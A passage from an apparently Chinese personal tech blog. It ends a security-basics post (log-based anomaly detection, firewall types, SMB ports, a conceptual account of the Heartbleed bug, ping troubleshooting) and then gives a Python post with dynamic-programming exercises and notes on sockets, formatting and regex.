rel="noopener">http://test.com/index.php?id=125</a><br>那么关于此请求的正常模型则为 [N,N,N],不匹配此模型的请求则为异常请求<br>当对日志中的请求建立完正常的模型，通过正常模型来匹配找出所有不符合模型的请求时，发现效果的确不错，漏报较少，不过实践中发现另一个问题，那便是数据的清洗，我们能否建立对应的模型，取决于对日志数据的理解，如果在数据前期提取时，我们无法准确的提取哪些是请求地址那些为请求参数可能无法对某个请求建立正常模型<br>关于此理论已经有人写出了Demo实现，地址：<a href="https://github.com/SparkSharly/Sharly" target="_blank" rel="noopener">https://github.com/SparkSharly/Sharly</a></p>
<hr>
<h3 id="防火墙的常用三种技术是什么"><a href="#防火墙的常用三种技术是什么" class="headerlink" title="防火墙的常用三种技术是什么"></a>防火墙的常用三种技术是什么</h3><p><strong>包过滤技术:</strong>工作在网络层，仅根据数据包头中的IP地址、端口号、协议类型等标志确定是否允许数据包通过</p>
<p><strong>应用代理:</strong>工作在应用层，通过编写不同的应用代理程序，实现对应用层数据的检测和分析(如SQL注入语句等)</p>
<p><strong>状态检测（Stateful Inspection）：</strong>工作在2~4层，访问控制方式与1同，但处理的对象不是单个数据包，而是整个连接，通过规则表和连接状态表，综合判断是否允许数据包通过。</p>
<p>完全内容检测（Compelete Content Inspection）：工作在2~7层，不仅分析数据包头信息、状态信息，而且对应用层协议进行还原和内容分析，有效防范混合型安全威胁。</p>
<hr>
<h3 id="139端口和445端口的区别是什么？是什么"><a href="#139端口和445端口的区别是什么？是什么" class="headerlink" title="139端口和445端口的区别是什么？是什么"></a>139端口和445端口的区别是什么？是什么</h3><p><strong>445–基于CIFS协议</strong></p>
<p><strong>139–基于SMB协议</strong></p>
<p><strong>用于文件和打印共享服务</strong></p>
<hr>
<h3 id="心脏滴血漏洞产生的原因，危害都有哪些？"><a href="#心脏滴血漏洞产生的原因，危害都有哪些？" class="headerlink" title="心脏滴血漏洞产生的原因，危害都有哪些？"></a><strong>心脏滴血漏洞产生的原因，危害都有哪些？</strong></h3><p>未能在memcpy()调用受害用户输入内容作为长度参数之前正确进行边界检查。攻击者可以追踪OpenSSL所分配的64KB缓存、将超出必要范围的字节信息复制到缓存当中再返回缓存内容，这样一来受害者的内存内容就会以每次64KB的速度进行泄露。</p>
<p>可以通过该漏洞读取每次攻击泄露出来的信息，所以可能也可以获取到服务器的私钥，用户cookie和密码等</p>
<p>在tls1_process_heartbeat函数和dtls1_process_heartbeat函数中，主要都是增加了对s-&gt;s3-&gt;rrec.length长度的判断。这 个函数后面的<strong>memcpy(bp, pl,  payload);填充payload长度的pl数据，而payload完全由用户控制</strong>，<strong>当传入过大数值时，可能导致越界访问pl之后的数据</strong>，若将读取的数据返回给用户即可造成敏感信息泄露。在一些测试用例中我们会发现response的length长度值总是比request的长度多出来了19个byte。读源代码可以知道，这是因为TLS和DTLS在处理心跳请求包逻辑中<strong>从堆空间上申请的内存大小由type、length、request的数据长度和pad四个部分组成</strong>，其中type,length,pad字段分为占<strong>1byte，2byte，16byte</strong>，所以response的数据总是比request的多出来19byte。 </p>
<h2 id="排查本机网络问题："><a href="#排查本机网络问题：" class="headerlink" title="排查本机网络问题："></a><strong>排查本机网络问题：</strong></h2><table>
<thead>
<tr>
<th><strong>1</strong></th>
<th><strong>ping 127.0.0.1</strong></th>
<th><strong>排查本机 TCP/IP 协议是否正常</strong></th>
</tr>
</thead>
<tbody><tr>
<td><strong>2</strong></td>
<td><strong>ping 本机IP</strong></td>
<td><strong>排查网卡或网卡驱动是否正常</strong></td>
</tr>
<tr>
<td><strong>3</strong></td>
<td><strong>ping 同网段IP</strong></td>
<td><strong>排查交换机端口工作模式、vlan划分</strong></td>
</tr>
<tr>
<td><strong>4</strong></td>
<td><strong>ping 通网段网关</strong></td>
<td><strong>排查主机到本地网络是否正常</strong></td>
</tr>
<tr>
<td><strong>5</strong></td>
<td><strong>ping 公网IP</strong></td>
<td><strong>排查路由是否正常</strong></td>
</tr>
<tr>
<td><strong>6</strong></td>
<td><strong>ping 公网某个域名</strong></td>
<td><strong>排查DNS服务配置是否正常</strong></td>
</tr>
</tbody></table>

      
      <!-- reward -->
      
    </div>
    
    
      <!-- copyright -->
      
    <footer class="article-footer">
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/" rel="tag">基础知识</a></li></ul>


    </footer>

  </div>

  

  
  
  

  

</article>
    
    <article id="post-python编程" class="article article-type-post" itemscope
  itemprop="blogPost" data-scroll-reveal>

  <div class="article-inner">
    
    <header class="article-header">
       
<h2 itemprop="name">
  <a class="article-title" href="/2020/04/06/python%E7%BC%96%E7%A8%8B/"
    >python编程</a
  >
</h2>
  

    </header>
    

    
    <div class="article-meta">
      <a href="/2020/04/06/python%E7%BC%96%E7%A8%8B/" class="article-date">
  <time datetime="2020-04-06T04:51:43.000Z" itemprop="datePublished">2020-04-06</time>
</a>
      
      
      
      
    </div>
    

    

    
    <div class="article-entry" itemprop="articleBody">
      


      

      
      <h2 id="动态规划⭐"><a href="#动态规划⭐" class="headerlink" title="动态规划⭐"></a><strong>动态规划⭐</strong></h2><p>众所周知，牛妹有很多很多粉丝，粉丝送了很多很多礼物给牛妹，牛妹的礼物摆满了地板。  地板是N×MN\times MN×M的格子，每个格子有且只有一个礼物，牛妹已知每个礼物的体积。 地板的坐标是左上角(1,1) 右下角（N, M）。 牛妹只想要从屋子左上角走到右下角，每次走一步，每步只能向下走一步或者向右走一步或者向右下走一步，每次走过一个格子，拿起（并且必须拿上）这个格子上的礼物。牛妹想知道，她能走到最后拿起的所有礼物体积最小和是多少？ </p>
<p><strong>真的是非常简单的动态规划了，好久没敲代码了，虽然简单，但是也要熟悉呀，略菜备注较多哈~</strong></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">selectPresent</span><span class="params">(self ,presentVolumn)</span>:</span></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> presentVolumn:</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line">        N=len(presentVolumn)<span class="comment">#行数</span></span><br><span class="line">        M=len(presentVolumn[<span class="number">0</span>])<span class="comment">#列数</span></span><br><span class="line">        dp=[[<span class="number">0</span>]*M <span class="keyword">for</span> _ <span class="keyword">in</span> range(N)]  <span class="comment">#for _ in range(x) _表示占位符，功能只是用于循环</span></span><br><span class="line">        print(dp)  <span class="comment">#dp用于表示走到该格子，当前的总价值</span></span><br><span class="line">        dp[<span class="number">0</span>][<span class="number">0</span>]=presentVolumn[<span class="number">0</span>][<span class="number">0</span>] <span class="comment">#初始化1x1</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,N):</span><br><span class="line">            dp[i][<span class="number">0</span>]=dp[i<span class="number">-1</span>][<span class="number">0</span>]+presentVolumn[i][<span class="number">0</span>] <span class="comment">#初始化价值</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,M):</span><br><span class="line">            dp[<span class="number">0</span>][i]=dp[<span class="number">0</span>][i<span class="number">-1</span>]+presentVolumn[<span class="number">0</span>][i] <span class="comment">#初始化</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,N):</span><br><span class="line">            <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">1</span>,M):</span><br><span class="line">                dp[i][j]=min(dp[i<span class="number">-1</span>][j<span class="number">-1</span>],dp[i<span class="number">-1</span>][j],dp[i][j<span class="number">-1</span>])+presentVolumn[i][j] <span class="comment">#更新总价值，看左上角、左边、上边的最小值，进行更新</span></span><br><span class="line">        <span class="keyword">return</span> dp[i][j]</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    n = int(input()) <span class="comment">#// 输入二维数组的行数</span></span><br><span class="line">    line = [[<span class="number">0</span>] * n] * n <span class="comment">#// 初始化二维数组</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(n):</span><br><span class="line">        line[i] = input().split(<span class="string">" "</span>) <span class="comment">#输入二维数组，同行数字用空格分隔，不同行则用回车换行</span></span><br><span class="line">        line[i] = [int(j) <span class="keyword">for</span> j <span class="keyword">in</span> line[i]]<span class="comment"># // 将数组中的每一行转换成整型</span></span><br><span class="line">    print(line) <span class="comment">#// 打印二维数组1</span></span><br><span class="line">    print(Solution().selectPresent(line))</span><br></pre></td></tr></table></figure>

<h2 id="动态规划⭐⭐—最长公共子序列"><a href="#动态规划⭐⭐—最长公共子序列" class="headerlink" title="动态规划⭐⭐—最长公共子序列"></a><strong>动态规划⭐⭐—最长公共子序列</strong></h2><p>  众所周知，牛妹是一个offer收割姬，这次面试她遇到了这样的一个问题。 </p>
<p>  给了一个序列，让找出最长的“凸子序列” </p>
<p>  何为“凸子序列”：数列中有一个xi,使得所有x0&lt;x1&lt;x2….xi-1&lt;xi且xi&gt;xi+1&gt;xi+1&gt;….&gt;xn  </p>
<p>  eg：12345431,是山峰序列，12345234不是山峰序列 </p>
<p>  注：单调递增或单调递减序列也算山峰序列；单独一个数是长度为1的山峰序列</p>
<p><strong>纠结了很久，还是没好好审题，要的是从第一个元素开始就递增的，这样只需要判断后面的元素是否比它大就行</strong></p>
<p><strong>然后从右侧反向递增，同前面一样，找比最后一个元素大的，然后对两者进行相加，减去公共的，即可求解</strong></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">mountainSequence</span><span class="params">(self, numberList )</span>:</span></span><br><span class="line">        <span class="comment"># write code here</span></span><br><span class="line">        n = len(numberList)</span><br><span class="line">        <span class="keyword">if</span> n==<span class="number">1</span> :<span class="keyword">return</span> <span class="number">1</span></span><br><span class="line">        up=[<span class="number">1</span>]*n</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(n): <span class="comment">#正向递增</span></span><br><span class="line">            print(<span class="string">"------"</span>)</span><br><span class="line">            <span class="keyword">for</span> j <span class="keyword">in</span> range(i):</span><br><span class="line">                <span class="keyword">if</span> numberList[i]&gt;numberList[j] <span class="keyword">and</span> up[i]&lt;up[j]+<span class="number">1</span>: <span class="comment">#正推</span></span><br><span class="line">                    up[i]=up[j]+<span class="number">1</span></span><br><span class="line">        down=[<span class="number">1</span>]*n</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(n<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">-1</span>): <span class="comment">#反向递增 (10,-1,-1) ,注意这是是n-1</span></span><br><span class="line">            <span class="keyword">for</span> j <span class="keyword">in</span> range(n<span class="number">-1</span>,i,<span class="number">-1</span>): <span class="comment">#(10,10.9.8..0,-1)</span></span><br><span class="line">                <span class="keyword">if</span> numberList[j]&lt;numberList[i] <span class="keyword">and</span> down[i]&lt;down[j]+<span class="number">1</span>:</span><br><span class="line">                    down[i]=down[j]+<span class="number">1</span></span><br><span class="line">        res=<span class="number">0</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(n):</span><br><span class="line">            res=max(res,down[i]+up[i]<span class="number">-1</span>) <span class="comment">#交叉点重复了</span></span><br><span class="line">            print(res)</span><br><span class="line">        <span class="keyword">return</span> res</span><br></pre></td></tr></table></figure>

<h2 id="动态规划⭐⭐—0-1背包问题"><a href="#动态规划⭐⭐—0-1背包问题" class="headerlink" title="动态规划⭐⭐—0-1背包问题"></a><strong>动态规划⭐⭐—0-1背包问题</strong></h2><p>众所周知，牛能和牛可乐经常收到小粉丝们送来的礼物，每个礼物有特定的价值，他俩想要尽可能按照自己所得价值来平均分配所有礼物。那么问题来了，在最优的情况下，他俩手中得到的礼物价值和的最小差值是多少呢？ </p>
<p>p.s 礼物都很珍贵，所以不可以拆开算哦 </p>
<p><strong>这题的本质就是0-1背包问题，只要将总价值向上取一半作为背包容量，尽可能的装满这个背包，则所求差值最小</strong></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">maxPresent</span><span class="params">(presentVec)</span>:</span></span><br><span class="line">    volumn = sum(presentVec)</span><br><span class="line">    one_person = (volumn+<span class="number">1</span>) // <span class="number">2</span></span><br><span class="line">    dp = [<span class="number">0</span> <span class="keyword">for</span> _ <span class="keyword">in</span> range(one_person + <span class="number">1</span>)] <span class="comment">#背包容量</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(len(presentVec)): <span class="comment">#物品数量</span></span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> range(one_person, presentVec[i] - <span class="number">1</span>, <span class="number">-1</span>): <span class="comment">#range(start, stop, step)  (背包容量,物体体积，倒过来)</span></span><br><span class="line">            <span class="keyword">if</span> dp[j - presentVec[i]] + presentVec[i] &gt; dp[j]: <span class="comment">#判断是否最优，更新背包</span></span><br><span class="line">                dp[j] = dp[j - presentVec[i]] + presentVec[i]</span><br><span class="line">                <span class="comment">#print(dp[j])</span></span><br><span class="line">    maxvalue = dp[one_person]</span><br><span class="line">    <span class="keyword">return</span> abs(maxvalue - (volumn - maxvalue))</span><br></pre></td></tr></table></figure>









<hr>
<h2 id="python3-语法随笔小记"><a href="#python3-语法随笔小记" class="headerlink" title="python3 语法随笔小记"></a><strong>python3 语法随笔小记</strong></h2><h4 id="data-b’’-join-buffer-如何理解？"><a href="#data-b’’-join-buffer-如何理解？" class="headerlink" title="data=b’’.join(buffer)如何理解？"></a><strong>data=b’’.join(buffer)如何理解？</strong></h4><p>b’’是一个空字节，join是连接列表的函数，buffer是一个字节串的列表<br>连起来的意思就是使用空字节把buffer这个字节列表连接在一起，成为一个新的字节串<br>这个是python3新的地方，以前join只能连接字符串，现在可以连接字节串<br>功能就是把[b’ab’,b’cd’,b’ef’]变成 b’abcdef’ </p>
<h4 id="time-sleep-t"><a href="#time-sleep-t" class="headerlink" title="time.sleep(t)"></a><strong>time.sleep(t)</strong></h4><p>需要加 import time</p>
<h4 id="socket-函数"><a href="#socket-函数" class="headerlink" title="socket()函数"></a><strong>socket()函数</strong></h4><p>服务器端套接字</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">s.bind()<span class="comment">#绑定地址（host,port）到套接字， 在AF_INET下,以元组（host,port）的形式表示地址。</span></span><br><span class="line">s.listen()<span class="comment">#开始TCP监听。backlog指定在拒绝连接之前，操作系统可以挂起的最大连接数量。该值至少为1，大部分应用程序设为5就可以了。</span></span><br><span class="line">s.accept()<span class="comment">#被动接受TCP客户端连接,(阻塞式)等待连接的到来</span></span><br></pre></td></tr></table></figure>

<p>客户端套接字</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">s.connect()<span class="comment">#主动初始化TCP服务器连接，。一般address的格式为元组（hostname,port），如果连接出错，返回socket.error错误。</span></span><br><span class="line">s.connect_ex()<span class="comment">#connect()函数的扩展版本,出错时返回出错码,而不是抛出异常</span></span><br></pre></td></tr></table></figure>

<p>公共用途的套接字函数</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">s.recv()<span class="comment">#接收TCP数据，数据以字符串形式返回，bufsize指定要接收的最大数据量。flag提供有关消息的其他信息，通常可以忽略。</span></span><br><span class="line">s.send()<span class="comment">#发送TCP数据，将string中的数据发送到连接的套接字。返回值是要发送的字节数量，该数量可能小于string的字节大小。</span></span><br><span class="line">s.sendall()<span class="comment">#完整发送TCP数据，完整发送TCP数据。将string中的数据发送到连接的套接字，但在返回之前会尝试发送所有数据。成功返回None，失败则抛出异常。</span></span><br><span class="line">s.recvfrom()<span class="comment">#接收UDP数据，与recv()类似，但返回值是（data,address）。其中data是包含接收数据的字符串，address是发送数据的套接字地址。</span></span><br><span class="line">s.sendto()<span class="comment">#发送UDP数据，将数据发送到套接字，address是形式为（ipaddr，port）的元组，指定远程地址。返回值是发送的字节数。</span></span><br><span class="line">s.close()<span class="comment">#关闭套接字</span></span><br><span class="line">s.getpeername()<span class="comment">#返回连接套接字的远程地址。返回值通常是元组（ipaddr,port）。</span></span><br><span class="line">s.getsockname()<span class="comment">#返回套接字自己的地址。通常是一个元组(ipaddr,port)</span></span><br><span class="line">s.setsockopt(level,optname,value)<span class="comment">#设置给定套接字选项的值。</span></span><br><span class="line">s.getsockopt(level,optname[.buflen])<span class="comment">#返回套接字选项的值。</span></span><br><span class="line">s.settimeout(timeout)<span class="comment">#设置套接字操作的超时期，timeout是一个浮点数，单位是秒。值为None表示没有超时期。一般，超时期应该在刚创建套接字时设置，因为它们可能用于连接的操作（如connect()）</span></span><br><span class="line">s.gettimeout()<span class="comment">#返回当前超时期的值，单位是秒，如果没有设置超时期，则返回None。</span></span><br><span class="line">s.fileno()<span class="comment">#返回套接字的文件描述符。</span></span><br><span class="line">s.setblocking(flag)<span class="comment">#如果flag为0，则将套接字设为非阻塞模式，否则将套接字设为阻塞模式（默认值）。非阻塞模式下，如果调用recv()没有发现任何数据，或send()调用无法立即发送数据，那么将引起socket.error异常。</span></span><br><span class="line">s.makefile()<span class="comment">#创建一个与该套接字相关连的文件</span></span><br></pre></td></tr></table></figure>

<p><strong>accept方法会返回一个含有两个元素的元组，（fd,addr）。</strong></p>
<p><strong>第一个元素是新的socket对象，服务器通过它与客户端通信。第二个元素是客户端的地址及端口信息。</strong></p>
<h4 id="格式化输出-s-d-等"><a href="#格式化输出-s-d-等" class="headerlink" title="格式化输出 %s %d 等"></a><strong>格式化输出 %s %d 等</strong></h4><table>
<thead>
<tr>
<th>%%</th>
<th>百分号标记</th>
</tr>
</thead>
<tbody><tr>
<td>%c</td>
<td>字符及其ASCII码</td>
</tr>
<tr>
<td><strong>%s</strong></td>
<td><strong>字符串</strong></td>
</tr>
<tr>
<td><strong>%d</strong></td>
<td><strong>有符号整数(十进制)</strong></td>
</tr>
<tr>
<td>%u</td>
<td>无符号整数(十进制)</td>
</tr>
<tr>
<td>%o</td>
<td>无符号整数(八进制)</td>
</tr>
<tr>
<td>%x</td>
<td>无符号整数(十六进制)</td>
</tr>
<tr>
<td>%X</td>
<td>无符号整数(十六进制大写字符)</td>
</tr>
<tr>
<td>%e</td>
<td>浮点数字(科学计数法)</td>
</tr>
<tr>
<td>%E</td>
<td>浮点数字(科学计数法，用E代替e)</td>
</tr>
<tr>
<td>%f</td>
<td>浮点数字(用小数点符号)</td>
</tr>
<tr>
<td>%g</td>
<td>浮点数字(根据值的大小采用%e或%f)</td>
</tr>
<tr>
<td>%G</td>
<td>浮点数字(类似于%g)</td>
</tr>
<tr>
<td>%p</td>
<td>指针(用十六进制打印值的内存地址)</td>
</tr>
<tr>
<td>%n</td>
<td>存储输出字符的数量放进参数列表的下一个变量中</td>
</tr>
</tbody></table>
<h4 id="format-格式化函数"><a href="#format-格式化函数" class="headerlink" title="format 格式化函数"></a>format 格式化函数</h4><p>基本语法是通过 {} 和 : 来代替以前的 % 。</p>
<p>format 函数可以接受不限个参数，位置可以不按顺序。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">print(<span class="string">"网站名：&#123;name&#125;, 地址 &#123;url&#125;"</span>.format(name=<span class="string">"菜鸟教程"</span>, url=<span class="string">"www.runoob.com"</span>))</span><br></pre></td></tr></table></figure>

<h3 id="python2和python3的一些区别"><a href="#python2和python3的一些区别" class="headerlink" title="python2和python3的一些区别"></a>python2和python3的一些区别</h3><p>b = b”example”    # bytes object   </p>
<p>s = “example”     # str object  </p>
<ul>
<li>chj=str.encode(c)  str to bytes </li>
<li>chj=bytes.decode(c) bytes to str</li>
</ul>
<hr>
<h2 id="Python-核心编程学习"><a href="#Python-核心编程学习" class="headerlink" title="Python 核心编程学习"></a><strong>Python 核心编程学习</strong></h2><h3 id="正则表达式"><a href="#正则表达式" class="headerlink" title="正则表达式"></a><strong>正则表达式</strong></h3><p><strong>引入re模块 ——-import re</strong></p>
<table>
<thead>
<tr>
<th align="center">表示法</th>
<th>描述</th>
<th>例子</th>
<th>匹配对象</th>
</tr>
</thead>
<tbody><tr>
<td align="center">chj</td>
<td>匹配文本字符串的值chj</td>
<td>chj</td>
<td></td>
</tr>
<tr>
<td align="center">re1 | re2</td>
<td>匹配正则表达式re1或者re2</td>
<td>chj | bar</td>
<td></td>
</tr>
<tr>
<td align="center">.</td>
<td>匹配任何字符（除了\n）</td>
<td>a.a</td>
<td></td>
</tr>
<tr>
<td align="center">^</td>
<td>匹配字符串的起始部分</td>
<td>^Dear</td>
<td></td>
</tr>
<tr>
<td align="center">$</td>
<td>匹配字符串的终止部分</td>
<td></td>
<td></td>
</tr>
<tr>
<td align="center"><strong>+</strong></td>
<td><strong>匹配1次或者多次前面的表达式</strong></td>
<td><strong>chj+</strong></td>
<td><strong>chj以及chjj   等价于{1,}</strong></td>
</tr>
<tr>
<td align="center">?</td>
<td><strong>匹配0次或者1次前面的表达式</strong></td>
<td>goo?</td>
<td></td>
</tr>
<tr>
<td align="center"></td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td align="center"></td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td align="center"></td>
<td></td>
<td></td>
<td></td>
</tr>
</tbody></table>
<p>re.compile(r’[A-F0-9]+’)</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line">s = <span class="string">"adfad asdfasdf asdfas asdfawef asd adsfas "</span></span><br><span class="line"> </span><br><span class="line">reObj1 = re.compile(<span class="string">'((\w+)\s+\w+)'</span>)</span><br><span class="line">reObj1.findall(s)</span><br><span class="line">[(<span class="string">'adfad asdfasdf'</span>, <span class="string">'adfad'</span>), (<span class="string">'asdfas asdfawef'</span>, <span class="string">'asdfas'</span>), (<span class="string">'asd adsfas'</span>, <span class="string">'asd'</span>)]</span><br><span class="line"> </span><br><span class="line">reObj2 = re.compile(<span class="string">'(\w+)\s+\w+'</span>)</span><br><span class="line">reObj2.findall(s)</span><br><span class="line">[<span class="string">'adfad'</span>, <span class="string">'asdfas'</span>, <span class="string">'asd'</span>]</span><br><span class="line"> </span><br><span class="line">reObj3 = re.compile(<span class="string">'\w+\s+\w+'</span>)</span><br><span class="line">reObj3.findall(s)</span><br><span class="line">[<span class="string">'adfad asdfasdf'</span>, <span class="string">'asdfas asdfawef'</span>, <span class="string">'asd adsfas'</span>]</span><br></pre></td></tr></table></figure>









<h2 id="Python-基础语法"><a href="#Python-基础语法" class="headerlink" title="Python 基础语法"></a><strong>Python 基础语法</strong></h2><p>非常非常基础的噢，适合新手观看，也算巩固下知识！</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1.</span>多行语句 可以用 \ 来分割</span><br><span class="line">total = item_one + \</span><br><span class="line">        item_two + \</span><br><span class="line">        item_three</span><br><span class="line"></span><br><span class="line"><span class="number">2.</span>python中数字有四种类型：整数、布尔型、浮点数和复数</span><br><span class="line">只有一种整数类型 int，表示为长整型，没有 python2 中的 Long</span><br><span class="line">bool (布尔), 如 <span class="literal">True</span></span><br><span class="line">float (浮点数), 如 <span class="number">1.23</span>、<span class="number">3E-2</span></span><br><span class="line">complex (复数), 如 <span class="number">1</span> + <span class="number">2j</span>、 <span class="number">1.1</span> + <span class="number">2.2j</span></span><br><span class="line"></span><br><span class="line"><span class="number">3.</span>字符串(String)</span><br><span class="line">单引号和双引号使用完全相同，转义符 <span class="string">'\'</span></span><br><span class="line"><span class="string">字符串可以用 + 运算符连接在一起，用 * 运算符重复</span></span><br><span class="line"><span class="string">Python 中的字符串有两种索引方式，从左往右以 0 开始，从右往左以 -1 开始</span></span><br><span class="line"><span class="string">#字符串的截取的语法格式如下：变量[头下标:尾下标:步长]</span></span><br><span class="line"><span class="string">#反斜杠可以用来转义，使用r可以让反斜杠不发生转义</span></span><br><span class="line"><span class="string">如 r"this is a line with \n" 则\n会显示，并不是换行</span></span><br><span class="line"><span class="string">str='</span>Runoo<span class="string">b'</span></span><br><span class="line"><span class="string">print(str * 2)   &gt;&gt;&gt; RunoobRunoob</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">4.空行</span></span><br><span class="line"><span class="string">函数之间或类的方法之间用空行分隔，表示一段新的代码的开始。</span></span><br><span class="line"><span class="string">书写时不插入空行，Python解释器运行也不会出错。</span></span><br><span class="line"><span class="string">但是空行的作用在于分隔两段不同功能或含义的代码，便于日后代码的维护或重构</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">5.Python可以在同一行中使用多条语句，语句之间使用分号(;)分割</span></span><br><span class="line"><span class="string">import sys; x = '</span>runoo<span class="string">b'; sys.stdout.write(x + '</span>\n<span class="string">')</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">6.print 默认输出是换行的，如果要实现不换行需要在变量末尾加上 end=""：</span></span><br><span class="line"><span class="string">print( x, end=" " )</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">7.导入模块和导入模块函数的小区别如下：</span></span><br><span class="line"><span class="string">将整个模块(somemodule)导入，格式为： import somemodule</span></span><br><span class="line"><span class="string">从某个模块中导入某个函数,格式为： from somemodule import somefunction</span></span><br><span class="line"><span class="string">将某个模块中的全部函数导入，格式为： from somemodule import *</span></span><br><span class="line"><span class="string">import sys</span></span><br><span class="line"><span class="string">print ('</span>命令行参数为:<span class="string">')</span></span><br><span class="line"><span class="string">for i in sys.argv:</span></span><br><span class="line"><span class="string">    print (i)</span></span><br><span class="line"><span class="string">print ('</span>\n python 路径为<span class="string">',sys.path)</span></span><br><span class="line"><span class="string">from sys import argv,path  #  导入特定的成员</span></span><br><span class="line"><span class="string">print('</span>path:<span class="string">',path) # 因为已经导入path成员，所以此处引用时不需要加sys.path</span></span><br></pre></td></tr></table></figure>

